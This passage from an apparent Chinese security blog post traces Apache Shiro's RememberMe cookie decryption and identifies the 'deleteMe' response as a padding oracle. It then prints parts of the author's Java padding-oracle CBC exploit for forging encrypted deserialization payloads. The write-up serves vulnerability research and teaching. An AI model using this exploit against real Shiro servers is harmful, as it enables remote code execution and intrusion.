class="line">回到org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals这个方法</span><br></pre></td></tr></table></figure></principalcollection></p>
+<p>public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {<br>    PrincipalCollection principals = null;<br>    try {<br>        byte[] bytes = getRememberedSerializedIdentity(subjectContext);<br>        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:<br>        if (bytes != null &amp;&amp; bytes.length &gt; 0) {<br>            principals = convertBytesToPrincipals(bytes, subjectContext);<br>        }<br>    } catch (RuntimeException re) {<br>        principals = onRememberedPrincipalFailure(re, subjectContext);<br>    }</p>
+<pre><code>return principals;
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我这里列出一条执行方法栈</span><br></pre></td></tr></table></figure></p>
+<p>protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {<br>    if (getCipherService() != null) {<br>        bytes = decrypt(bytes);<br>    }<br>    return deserialize(bytes);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
+<p>protected byte[] decrypt(byte[] encrypted) {<br>    byte[] serialized = encrypted;<br>    CipherService cipherService = getCipherService();<br>    if (cipherService != null) {<br>        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());<br>        serialized = byteSource.getBytes();<br>    }<br>    return serialized;<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
+<p>public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException {</p>
+<pre><code>byte[] encrypted = ciphertext;
+
+//No IV, check if we need to read the IV from the stream:
+byte[] iv = null;
+
+if (isGenerateInitializationVectors(false)) {
+    try {
+        //We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it
+        //is:
+        // - the first N bytes is the initialization vector, where N equals the value of the
+        // &apos;initializationVectorSize&apos; attribute.
+        // - the remaining bytes in the method argument (arg.length - N) is the real cipher text.
+
+        //So we need to chunk the method argument into its constituent parts to find the IV and then use
+        //the IV to decrypt the real ciphertext:
+
+        int ivSize = getInitializationVectorSize();
+        int ivByteSize = ivSize / BITS_PER_BYTE;
+
+        //now we know how large the iv is, so extract the iv bytes:
+        iv = new byte[ivByteSize];
+        System.arraycopy(ciphertext, 0, iv, 0, ivByteSize);
+
+        //remaining data is the actual encrypted ciphertext.  Isolate it:
+        int encryptedSize = ciphertext.length - ivByteSize;
+        encrypted = new byte[encryptedSize];
+        System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize);
+    } catch (Exception e) {
+        String msg = &quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;;
+        throw new CryptoException(msg, e);
+    }
+}
+
+return decrypt(encrypted, key, iv);
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
+<p>private byte[] crypt(byte[] bytes, byte[] key, byte[] iv, int mode) throws IllegalArgumentException, CryptoException {<br>    if (key == null || key.length == 0) {<br>        throw new IllegalArgumentException(“key argument cannot be null or empty.”);<br>    }<br>    javax.crypto.Cipher cipher = initNewCipher(mode, key, iv, false);<br>    return crypt(cipher, bytes);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
+<p>private byte[] crypt(javax.crypto.Cipher cipher, byte[] bytes) throws CryptoException {<br>    try {<br>        return cipher.doFinal(bytes);<br>    } catch (Exception e) {<br>        String msg = “Unable to execute ‘doFinal’ with cipher instance [“ + cipher + “].”;<br>        throw new CryptoException(msg, e);<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这个执行栈有点长，但最终执行到最后一步crypt()方法时，如果解密出现padding错误的话，就会直接抛出异常```throw new CryptoException(msg, e);```，一直向上，直到我们刚刚说的getRememberedPrincipals()方法，接着被try、catch捕获异常，由onRememberedPrincipalFailure()方法进行处理</span><br><span class="line"></span><br><span class="line">跟进其方法发现，forgetIdentity()方法在当前的AbstractRememberMeManager类并没有实现</span><br></pre></td></tr></table></figure></p>
+<p>protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) {</p>
+<pre><code>if (log.isWarnEnabled()) {
+    String message = &quot;There was a failure while trying to retrieve remembered principals.  This could be due to a &quot; +
+            &quot;configuration problem or corrupted principals.  This could also be due to a recently &quot; +
+            &quot;changed encryption key, if you are using a shiro.ini file, this property would be &quot; +
+            &quot;&apos;securityManager.rememberMeManager.cipherKey&apos; see: http://shiro.apache.org/web.html#Web-RememberMeServices. &quot; +
+            &quot;The remembered identity will be forgotten and not used for this request.&quot;;
+    log.warn(message);
+}
+forgetIdentity(context);
+//propagate - security manager implementation will handle and warn appropriately
+throw e;
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跟进其实现类org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.SubjectContext)</span><br></pre></td></tr></table></figure></p>
+<p>public void forgetIdentity(SubjectContext subjectContext) {<br>    if (WebUtils.isHttp(subjectContext)) {<br>        HttpServletRequest request = WebUtils.getHttpRequest(subjectContext);<br>        HttpServletResponse response = WebUtils.getHttpResponse(subjectContext);<br>        forgetIdentity(request, response);<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>private void forgetIdentity(HttpServletRequest request, HttpServletResponse response) {<br>    getCookie().removeFrom(request, response);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到，最后调用的是rememberMe这个cookie对应的SimpleCookie对象的removeFrom()方法</span><br></pre></td></tr></table></figure></p>
+<p>public static final String DELETED_COOKIE_VALUE = “deleteMe”;</p>
+<p>public void removeFrom(HttpServletRequest request, HttpServletResponse response) {<br>    String name = getName();<br>    String value = DELETED_COOKIE_VALUE;<br>    String comment = null; //don’t need to add extra size to the response - comments are irrelevant for deletions<br>    String domain = getDomain();<br>    String path = calculatePath(request);<br>    int maxAge = 0; //always zero for deletion<br>    int version = getVersion();<br>    boolean secure = isSecure();<br>    boolean httpOnly = false; //no need to add the extra text, plus the value ‘deleteMe’ is not sensitive at all<br>    SameSiteOptions sameSite = null;</p>
+<pre><code>addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly, sameSite);
+
+log.trace(&quot;Removed &apos;{}&apos; cookie by setting maxAge=0&quot;, name);
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">很简单，源码可以看出来，覆盖掉了rememberMe这个cookie的值为deleteMe</span><br><span class="line"></span><br><span class="line">那么，答案就呼之欲出了，只要padding错误，服务端就会返回一个cookie: **rememberMe=deleteMe;**</span><br><span class="line"></span><br><span class="line">那么，上面讲述了padding错误的返回特征后，那么padding正确的特征到底是如何呢？</span><br><span class="line"></span><br><span class="line">因为java原生的反序列化，是按照约定的格式读取序列化数据，一步一步反序列化的，那么也就是说，我如果在序列化数据后面加入一些数据，是不会影响反序列化的，这里可以参考一下[《浅析Java序列化和反序列化》](https://xz.aliyun.com/t/3847)</span><br><span class="line"></span><br><span class="line">那么，既然在序列化数据后面加上一段数据，不会影响反序列化，也就是说，我们可以利用一个已有的rememberMe cookie值（AES加密的序列化数据），在其后加入一段数据，只要ASE能正确解密数据，就必然能被反序列化。</span><br><span class="line"></span><br><span class="line">也就是说，在padding正常的情况下，反序列化能正常进行，web系统能知道我们的身份，在启用RememberMe，也就是配置了user的filter chain的接口或页面，就能正常的返回数据。</span><br><span class="line"></span><br><span class="line">为什么说 *配置了user的filter chain的接口或页面，就能正常的返回数据* ？</span><br><span class="line"></span><br><span class="line">我们回到最初的org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal处，在创建完成Subject后，我们说过，会执行一个filter chain</span><br></pre></td></tr></table></figure></p>
+<p>subject.execute(new Callable() {<br>    public Object call() throws Exception {<br>        updateSessionLastAccessTime(request, response);<br>        executeChain(request, response, chain);<br>        return null;<br>    }<br>});<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跟进其executeChain()方法</span><br></pre></td></tr></table></figure></p>
+<p>protected void executeChain(ServletRequest request, ServletResponse response, FilterChain origChain)<br>        throws IOException, ServletException {<br>    FilterChain chain = getExecutionChain(request, response, origChain);<br>    chain.doFilter(request, response);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其中比较关心的是getExecutionChain()方法，通过调用这个方法，返回了一个FilterChain，然后执行其doFilter()方法过滤请求</span><br></pre></td></tr></table></figure></p>
+<p>protected FilterChain getExecutionChain(ServletRequest request, ServletResponse response, FilterChain origChain) {<br>    FilterChain chain = origChain;</p>
+<pre><code>FilterChainResolver resolver = getFilterChainResolver();
+if (resolver == null) {
+    log.debug(&quot;No FilterChainResolver configured.  Returning original FilterChain.&quot;);
+    return origChain;
+}
+
+FilterChain resolved = resolver.getChain(request, response, origChain);
+if (resolved != null) {
+    log.trace(&quot;Resolved a configured FilterChain for the current request.&quot;);
+    chain = resolved;
+} else {
+    log.trace(&quot;No FilterChain configured for the current request.  Using the default.&quot;);
+}
+
+return chain;
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">到这里，我们应该隐约还有一些前面讲的内容的记忆吧？。。。没错，就是FilterChainResolver的实现PathMatchingFilterChainResolver，这里就是对其进行调用的地方了，通过调用其getChain()方法，找到相应的过滤器链执行过滤请求，那么，上面所说的user，对应的filter就是UserFilter</span><br></pre></td></tr></table></figure></p>
+<p>public class UserFilter extends AccessControlFilter {</p>
+<pre><code>/**
+ * Returns &lt;code&gt;true&lt;/code&gt; if the request is a
+ * {@link #isLoginRequest(javax.servlet.ServletRequest, javax.servlet.ServletResponse) loginRequest} or
+ * if the current {@link #getSubject(javax.servlet.ServletRequest, javax.servlet.ServletResponse) subject}
+ * is not &lt;code&gt;null&lt;/code&gt;, &lt;code&gt;false&lt;/code&gt; otherwise.
+ *
+ * @return &lt;code&gt;true&lt;/code&gt; if the request is a
+ * {@link #isLoginRequest(javax.servlet.ServletRequest, javax.servlet.ServletResponse) loginRequest} or
+ * if the current {@link #getSubject(javax.servlet.ServletRequest, javax.servlet.ServletResponse) subject}
+ * is not &lt;code&gt;null&lt;/code&gt;, &lt;code&gt;false&lt;/code&gt; otherwise.
+ */
+protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {
+    if (isLoginRequest(request, response)) {
+        return true;
+    } else {
+        Subject subject = getSubject(request, response);
+        // If principal is not null, then the user is known and should be allowed access.
+        return subject.getPrincipal() != null;
+    }
+}
+
+/**
+ * This default implementation simply calls
+ * {@link #saveRequestAndRedirectToLogin(javax.servlet.ServletRequest, javax.servlet.ServletResponse) saveRequestAndRedirectToLogin}
+ * and then immediately returns &lt;code&gt;false&lt;/code&gt;, thereby preventing the chain from continuing so the redirect may
+ * execute.
+ */
+protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
+    saveRequestAndRedirectToLogin(request, response);
+    return false;
+}
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">重点在isAccessAllowed()方法，判断了请求是否是登录请求，若是，则直接通过，否则会从上下文中取出前面创建的Subject，其中含有前面反序列化rememberMe解密数据得到的PrincipalCollection，也就是说，只要能正常反序列化成功，那么这里就会直接通过。</span><br><span class="line"></span><br><span class="line">从这里我们就可以知道，我们为什么需要一个配置为user的接口或者页面了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">好了，两个最重要的条件就出来了：</span><br><span class="line">1. padding失败，返回一个cookie: **rememberMe=deleteMe;**</span><br><span class="line">2. padding成功，返回正常的响应数据</span><br><span class="line"></span><br><span class="line">如果我们要进行padding oracle攻击，那我们只要判断响应头是否包含有cookie: **rememberMe=deleteMe;**，就能确定padding是否正常了。</span><br><span class="line"></span><br><span class="line">那padding oracle究竟如何去实现呢？这里我推荐p0&apos;s师傅的文章[《Shiro Padding Oracle Attack 反序列化》](https://p0sec.net/index.php/archives/126/)</span><br><span class="line"></span><br><span class="line">我这里也自己手撸了一个Java版的shiro padding oracle cbc attack exploits，放在marshalsec，大家可以参考一下，https://github.com/threedr3am/marshalsec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">熟悉Java代码的，很容易能看出来，下面的代码，每一轮padding爆破是把一个data数据拼接到原有的rememberMe cookie，然后请求web服务端，根据其响应做出判断</span><br></pre></td></tr></table></figure></p>
+<p>private void attack(byte[] bytes) {<br>byte[] originRememberMe = Base64.getDecoder().decode(rememberMe.getBytes());</p>
+<p>CBCResult cbcResult = PaddingOracleCBCForShiro<br>    .paddingOracleCBC(bytes, data -&gt; {<br>      try {<br>        byte[] newRememberMe = new byte[originRememberMe.length + data.length];<br>        System.arraycopy(originRememberMe, 0, newRememberMe, 0, originRememberMe.length);<br>        System.arraycopy(data, 0, newRememberMe, originRememberMe.length, data.length);<br>        return request(newRememberMe);<br>      } catch (Exception e) {<br>        e.printStackTrace();<br>      }<br>      return false;<br>    });</p>
+<p>byte[] remenberMe = new byte[cbcResult.getIv().length + cbcResult.getCrypt().length];<br>System.arraycopy(cbcResult.getIv(), 0, remenberMe, 0, cbcResult.getIv().length);<br>System.arraycopy(cbcResult.getCrypt(), 0, remenberMe, cbcResult.getIv().length,<br>    cbcResult.getCrypt().length);<br>System.out.println(“remenberMe=” + Base64.getEncoder().encodeToString(remenberMe));<br>request(remenberMe);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而下面的代码，就是像荐p0&apos;s师傅文章所说的，不断用两个block，去padding oracle，得到middle后，接着进行cbc翻转攻击，把我们预期要解密出cbcResBytes，也就是一个序列化的攻击payload，一段段的利用cbc翻转，得到相应的密文，接着存储到res这个数值，在全部都遍历攻击完毕后，通过CBCResult这个对象返回</span><br></pre></td></tr></table></figure></p>
+<p>public static CBCResult paddingOracleCBC(byte[] cbcResBytes,<br>      Predicate&lt;byte[]&gt; predicate) {</p>
+<pre><code>//填充期望结果长度为16字节的倍数
+cbcResBytes = padding(cbcResBytes);
+System.out.println(&quot;[payload-length]:&quot; + cbcResBytes.length);
+//该值为期望结果的组数-1，用于不断反向取出每组期望值去CBC攻击
+int cbcResGroup = cbcResBytes.length / 16;
+byte[] res = new byte[cbcResBytes.length];
+byte[] iv = new byte[16];
+byte[] crypt = new byte[16];
+
+int paddingLen = 0;
+for (; cbcResGroup &gt; 0; cbcResGroup--) {
+  System.out.println(&quot;[padding-length]:&quot; + (paddingLen+=16) + &quot;/&quot; + cbcResBytes.length);
+  byte[] middle = paddingOracle(iv, crypt, predicate);
+  byte[] plain = generatePlain(iv, middle);
+  byte[] plainTmp = Arrays.copyOf(plain, plain.length);
+  plainTmp = unpadding(plainTmp);
+  System.out.println(&quot;[plain]:&quot; + new String(plainTmp));
+  byte[] cbcResTmp = Arrays.copyOfRange(cbcResBytes, (cbcResGroup - 1) * 16, cbcResGroup * 16);
+  //构造新的iv，cbc攻击
+  byte[] ivBytesNew = cbcAttack(iv, cbcResTmp, plain);
+  System.out.println(&quot;[cbc-&gt;plain]:&quot; + new String(generatePlain(ivBytesNew, middle)));
+
+  System.arraycopy(crypt, 0, res, (cbcResGroup - 1) * 16, 16);
+
+  crypt = ivBytesNew;
+  iv = new byte[iv.length];
+}
+
+return new CBCResult(crypt, res);
+</code></pre><p>}<br><code>`</code></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>我对Padding Oracle攻击的分析和思考（详细）：<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a></p>
+<p>Shiro Padding Oracle Attack 反序列化：<a href="https://p0sec.net/index.php/archives/126/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/126/</a></p>
+<p>浅析Java序列化和反序列化：<a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">https://xz.aliyun.com/t/3847</a></p>
+<p>marshalsec：<a href="https://github.com/threedr3am/marshalsec" target="_blank" rel="noopener">https://github.com/threedr3am/marshalsec</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Java反序列化/" rel="tag"># Java反序列化</a>
+          
+            <a href="/tags/RCE/" rel="tag"># RCE</a>
+          
+            <a href="/tags/padding-oracle-cbc/" rel="tag"># padding oracle cbc</a>
+          
+            <a href="/tags/Apache-Shiro/" rel="tag"># Apache Shiro</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/14/dubbo源码浅析-默认dubbo协议反序列化利用之hessian2/" rel="next" title="dubbo源码浅析-默认dubbo协议反序列化利用之hessian2">
+                <i class="fa fa-chevron-left"></i> dubbo源码浅析-默认dubbo协议反序列化利用之hessian2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/9999/12/31/学习与生活/" rel="prev" title="学习与生活">
+                学习与生活 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg" alt="threedr3am">
+            
+              <p class="site-author-name" itemprop="name">threedr3am</p>
+              <p class="site-description motion-element" itemprop="description">菜到如此</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/threedr3am" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://rui0.cn/" title="ruilin" target="_blank">ruilin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.leadroyal.cn/" title="leadroyal(卓卓师傅)" target="_blank">leadroyal(卓卓师傅)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.kingkk.com/" title="kingkk" target="_blank">kingkk</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://driverxdw.github.io/" title="in0va'S(dw大鸽)" target="_blank">in0va'S(dw大鸽)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://gengzongyuan.github.io/" title="大树先生(测试大牛)" target="_blank">大树先生(测试大牛)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chensem.github.io/" title="chensem(逆向龙哥)" target="_blank">chensem(逆向龙哥)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://meizjm3i.github.io/" title="梅子酒" target="_blank">梅子酒</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.orange.tw/" title="orange" target="_blank">orange</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Shiro源码浅析"><span class="nav-number">2.</span> <span class="nav-text">0x01 Shiro源码浅析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Shiro简单使用"><span class="nav-number">2.1.</span> <span class="nav-text">1. Shiro简单使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-1-依赖（pom-xml）"><span class="nav-number">2.1.1.</span> <span class="nav-text">1.1 依赖（pom.xml）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-2-web配置（web-xml）"><span class="nav-number">2.1.2.</span> <span class="nav-text">1.2 web配置（web.xml）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-3-shiro配置（spring-shiro-xml）"><span class="nav-number">2.1.3.</span> <span class="nav-text">1.3 shiro配置（spring-shiro.xml）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-4-登录和注销接口"><span class="nav-number">2.1.4.</span> <span class="nav-text">1.4 登录和注销接口</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-源码运行原理"><span class="nav-number">2.2.</span> <span class="nav-text">2. 源码运行原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-反序列化远古洞（Shiro-lt-1-2-4）"><span class="nav-number">3.</span> <span class="nav-text">0x02 反序列化远古洞（Shiro &lt;= 1.2.4）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">threedr3am</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
